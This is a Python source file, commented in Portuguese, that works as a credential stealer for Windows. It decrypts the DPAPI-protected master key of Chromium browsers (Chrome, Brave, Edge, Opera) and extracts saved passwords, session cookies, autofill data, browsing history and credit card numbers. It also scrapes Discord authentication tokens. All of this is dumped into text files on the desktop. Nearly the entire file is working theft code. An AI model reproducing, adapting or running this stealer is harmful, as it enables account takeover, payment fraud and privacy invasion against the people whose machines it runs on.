import sqlite3
import os
import re
from base64 import b64decode
from json import loads
from shutil import copy2
from sqlite3 import connect
import win32crypt
from Crypto.Cipher import AES
import ctypes
from tqdm import tqdm 
import logging

# Configurar o log
logging.basicConfig(filename='log_extracao.txt', level=logging.INFO)

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

# Dicionários de diretórios dos navegadores e aplicativos de onde serão extraídas as informações
tokenPaths = {
    'Discord': f"{roaming}\\Discord",
    'Discord Canary': f"{roaming}\\discordcanary",
    'Discord PTB': f"{roaming}\\discordptb",
    'Google Chrome': f"{local}\\Google\\Chrome\\User Data\\Default",
    'Opera': f"{roaming}\\Opera Software\\Opera Stable",
    'Brave': f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    'Yandex': f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
    'OperaGX': f"{roaming}\\Opera Software\\Opera GX Stable"
}

browser_loc = {
    "Chrome": f"{local}\\Google\\Chrome",
    "Brave": f"{local}\\BraveSoftware\\Brave-Browser",
    "Edge": f"{local}\\Microsoft\\Edge",
    "Opera": f"{roaming}\\Opera Software\\Opera Stable",
    "OperaGX": f"{roaming}\\Opera Software\\Opera GX Stable",
}

# Função para retornar o caminho da área de trabalho
def get_desktop_path():
    # Retorna o caminho da área de trabalho do usuário.
    csidl_desktop = 0x0010
    buf = ctypes.create_unicode_buffer(260)
    ctypes.windll.shell32.SHGetFolderPathW(0, csidl_desktop, 0, 0, buf)
    return buf.value

# Definindo o caminho do arquivo para salvar os resultados na área de trabalho
OUTPUT_FILE_PATH = os.path.join(get_desktop_path(), f"extracao_{os.getlogin()}.txt")

# Arquivos de saída agora salvos na área de trabalho
fileCookies = os.path.join(get_desktop_path(), f"cooks_{os.getlogin()}.txt")
filePass = os.path.join(get_desktop_path(), f"passes_{os.getlogin()}.txt")
fileInfo = os.path.join(get_desktop_path(), f"info_{os.getlogin()}.txt")

# Perfis do Chrome
for i in os.listdir(browser_loc['Chrome'] + "\\User Data"):
    if i.startswith("Profile "):
        browser_loc["ChromeP"] = f"{local}\\Google\\Chrome\\User Data\\{i}"

# Função para extrair histórico de navegação
def extrair_historico_navegacao(bd_historico, arquivo_saida):
    if os.path.exists(bd_historico):
        copy2(bd_historico, "HistoricoTemp.db")
        
        # Verifica se o arquivo temporário foi copiado corretamente
        if not os.path.exists("HistoricoTemp.db"):
            with open(arquivo_saida, "a") as f:
                f.write("Falha ao copiar o banco de dados de historico.\n")
            return
        
        conn = None
        try:
            conn = connect("HistoricoTemp.db")
            cur = conn.cursor()
            
            # Verifica se a tabela "urls" existe no banco de dados
            cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='urls';")
            if cur.fetchone() is None:
                with open(arquivo_saida, "a") as f:
                    f.write("Tabela 'urls' nao encontrada no banco de dados\n")
                return
            
            # Tenta extrair os dados do histórico
            cur.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
            with open(arquivo_saida, "a") as f:
                f.write("*** Historico de Navegacao ***\n")
            rows = cur.fetchall()
            
            if not rows:
                with open(arquivo_saida, "a") as f:
                    f.write("Nenhum dado de historico encontrado\n")
            else:
                for row in tqdm(rows, desc="Extraindo historico de navegacao"):
                    url, titulo, cont_visitas, ultimo_acesso = row
                    dados = f"URL: {url}\nTitulo: {titulo}\nVisitas: {cont_visitas}\nUltimo Acesso: {ultimo_acesso}\n\n"
                    with open(arquivo_saida, "a") as f:
                        f.write(dados)
        except sqlite3.Error as e:
            with open(arquivo_saida, "a") as f:
                f.write(f"Erro ao acessar a tabela 'urls': {str(e)}\n")
        finally:
            # Fecha o cursor e a conexão explicitamente
            if conn:
                conn.close()
            # Agora é seguro remover o arquivo
            if os.path.exists("HistoricoTemp.db"):
                os.remove("HistoricoTemp.db")
    else:
        with open(arquivo_saida, "a") as f:
            f.write("Arquivo de historico nao encontrado\n")


# Função para extrair dados de preenchimento automático (autofill)
def extrair_autofill(bd_autofill, arquivo_saida):
    if os.path.exists(bd_autofill):
        copy2(bd_autofill, "AutofillTemp.db")
        
        # Verifica se o arquivo temporário foi copiado corretamente
        if not os.path.exists("AutofillTemp.db"):
            with open(arquivo_saida, "a") as f:
                f.write("Falha ao copiar o banco de dados de preenchimento automatico.\n")
            return

        conn = None
        try:
            conn = connect("AutofillTemp.db")
            cur = conn.cursor()

            # Verifica se a tabela "autofill" existe no banco de dados
            cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='autofill';")
            if cur.fetchone() is None:
                with open(arquivo_saida, "a") as f:
                    f.write("Tabela 'autofill' nao encontrada no banco de dados\n")
                return
            
            # Tenta extrair os dados de preenchimento automático
            cur.execute("SELECT name, value FROM autofill")
            with open(arquivo_saida, "a") as f:
                f.write("*** Dados de Preenchimento Automatico ***\n")
            rows = cur.fetchall()
            
            if not rows:
                with open(arquivo_saida, "a") as f:
                    f.write("Nenhum dado de preenchimento automatico encontrado\n")
            else:
                for row in rows:
                    nome, valor = row
                    dados = f"Campo: {nome}\nValor: {valor}\n\n"
                    with open(arquivo_saida, "a") as f:
                        f.write(dados)
        except sqlite3.Error as e:
            with open(arquivo_saida, "a") as f:
                f.write(f"Erro ao acessar a tabela 'autofill': {str(e)}\n")
        finally:
            # Fecha o cursor e a conexão explicitamente
            if conn:
                conn.close()
            # Agora é seguro remover o arquivo
            if os.path.exists("AutofillTemp.db"):
                os.remove("AutofillTemp.db")
    else:
        with open(arquivo_saida, "a") as f:
            f.write("Arquivo de preenchimento automatico nao encontrado\n")

# Função para extrair dados de cartão de crédito
def extrair_cartao_credito(local_state, bd_cartao, arquivo_saida):
    if os.path.exists(local_state):
        with open(local_state) as f:
            state_data = loads(f.read())
        chave_mestra = b64decode(state_data["os_crypt"]["encrypted_key"])[5:]
        chave_mestra = win32crypt.CryptUnprotectData(chave_mestra, None, None, None, 0)[1]

        if os.path.exists(bd_cartao):
            copy2(bd_cartao, "CartaoTemp.db")
            with connect("CartaoTemp.db") as conn:
                cur = conn.cursor()
            cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            with open(arquivo_saida, "a") as f:
                f.write("*** Informacoes de Cartao de Credito ***\n")
            for row in cur.fetchall():
                nome_cartao, mes_exp, ano_exp, numero_encriptado = row
                init_vector = numero_encriptado[3:15]
                enc_numero = numero_encriptado[15:-16]
                cipher = generate_cipher(chave_mestra, init_vector)
                numero_cartao = decrypt_payload(cipher, enc_numero).decode()
                dados = f"Nome no Cartao: {nome_cartao}\nNumero: {numero_cartao}\nExpiracao: {mes_exp}/{ano_exp}\n\n"
                with open(arquivo_saida, "a") as f:
                    f.write(dados)
            os.remove("CartaoTemp.db")
    else:
        with open(arquivo_saida, "a") as f:
            f.write("Informacoes de cartao de credito nao encontradas\n")

# Função auxiliar para gerar o cipher
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

# Função auxiliar para descriptografar payload
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

# Função para descriptografar navegadores e extrair dados adicionais
def decrypt_files(path, browser):
    if os.path.exists(path):
        logging.info(f"Descriptografando dados de {browser}")
        decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser)
        extrair_historico_navegacao(Login_Data(path), fileInfo)
        extrair_autofill(Login_Data(path), fileInfo)
        extrair_cartao_credito(Local_State(path), Login_Data(path), fileInfo)
    else:
        with open(fileInfo, "a") as f:
            f.write(browser + " nao esta instalado\n")

# Funções auxiliares de descriptografia (Tokens, Cifragem, etc.)
def decrypt_token(buff, master_key):
    try:
        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,
                       buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        pass

def get_tokens(path):
    cleaned = []
    tokens = []
    done = []
    lev_db = f"{path}\\Local Storage\\leveldb\\"
    loc_state = f"{path}\\Local State"
    if os.path.exists(loc_state):
        with open(loc_state, "r") as file:
            key = loads(file.read())['os_crypt']['encrypted_key']
        for file in os.listdir(lev_db):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue
            else:
                try:
                    with open(lev_db + file, "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError:
                    continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            done += [decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])]
    else:
        for file_name in os.listdir(path):
            try:
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            done.append(token)
            except:
                continue
    return done

# Descriptografar conteúdo de navegadores
def decrypt_browser(LocalState, LoginData, CookiesFile, name):
    if os.path.exists(LocalState):
        with open(LocalState) as f:
            local_state = f.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

        if os.path.exists(LoginData):
            copy2(LoginData, "TempMan.db")
            with connect("TempMan.db") as conn:
                cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            with open(filePass, "a") as f:
                f.write(f"*** {name} ***\n")
            for index, logins in enumerate(cur.fetchall()):
                try:
                    if not logins[0]:
                        continue
                    if not logins[1]:
                        continue
                    if not logins[2]:
                        continue
                    ciphers = logins[2]
                    init_vector = ciphers[3:15]
                    enc_pass = ciphers[15:-16]

                    cipher = generate_cipher(master_key, init_vector)
                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
                    to_print = f"URL : {logins[0]}\nName: {logins[1]}\nPass: {dec_pass}\n\n"
                    with open(filePass, "a") as f:
                        f.write(to_print)
                except (Exception, FileNotFoundError):
                    pass
        else:
            with open(fileInfo, "a") as f:
                f.write(f"{name} Arquivo Login Data nao encontrado\n")

        if os.path.exists(CookiesFile):
            copy2(CookiesFile, "CookMe.db")
            with connect("CookMe.db") as conn:
                curr = conn.cursor()
            curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
            with open(fileCookies, "a") as f:
                f.write(f"*** {name} ***\n")
            for index, cookies in enumerate(curr.fetchall()):
                try:
                    if not cookies[0]:
                        continue
                    if not cookies[1]:
                        continue
                    if not cookies[2]:
                        continue
                    if "google" in cookies[0]:
                        continue
                    ciphers = cookies[2]
                    init_vector = ciphers[3:15]
                    enc_pass = ciphers[15:-16]
                    cipher = generate_cipher(master_key, init_vector)
                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
                    to_print = f'URL : {cookies[0]}\nName: {cookies[1]}\nCook: {dec_pass}\n\n'
                    with open(fileCookies, "a") as f:
                        f.write(to_print)
                except (Exception, FileNotFoundError):
                    pass
        else:
            with open(fileInfo, "a") as f:
                f.write(f"Arquivo de cookies do {name} nao encontrado\n")
    else:
        with open(fileInfo, "a") as f:
            f.write(f"{name} Arquivo Local State nao encontrado\n")
            


# Definir o caminho dos arquivos
def Local_State(path):
    return f"{path}\\User Data\\Local State"

def Login_Data(path):
    if "Profile" in path:
        return f"{path}\\Login Data"
    else:
        return f"{path}\\User Data\\Default\\Login Data"

def Cookies(path):
    if "Profile" in path:
        return f"{path}\\Network\\Cookies"
    else:
        return f"{path}\\User Data\\Default\\Network\\Cookies"

# Função para lidar com tokens
def main_tokens():
    token_count = 1  # Contador de tokens
    for platform, path in tokenPaths.items():
        if not os.path.exists(path):
            continue
        try:
            tokens = set(get_tokens(path))
        except:
            continue
        if not tokens:
            continue

        # Abrir o arquivo apenas uma vez para escrita e numerar os tokens
        with open(fileInfo, "a") as f:
            f.write("Tokens do Discord\n")
            for i in tokens:
                f.write(f"Token {token_count} {str(i)}\n")
                token_count += 1  # Incrementa o contador para o próximo token


# Função para processar arquivos
def file_handler(file):
    if os.path.exists(file):
        try:
            with open(OUTPUT_FILE_PATH, "a", encoding="utf-8") as f_out:  # Use 'utf-8' para saída
                with open(file, "r", encoding="utf-8", errors="ignore") as f_in:  # Use 'utf-8' para leitura, ignorando erros
                    f_out.write(f_in.read())
        except UnicodeDecodeError as e:
            with open(OUTPUT_FILE_PATH, "a") as f_out:
                f_out.write(f"\nErro ao processar o arquivo {file}: {str(e)}\n")
        finally:
            os.remove(file)


# Função principal
for_handler = (
    fileInfo,
    filePass,
    fileCookies,
    "TempMan.db",
    "CookMe.db"
)

def main():
    for name, path in browser_loc.items():
        decrypt_files(path, name)
    main_tokens()
    for i in for_handler:
        file_handler(i)

main()
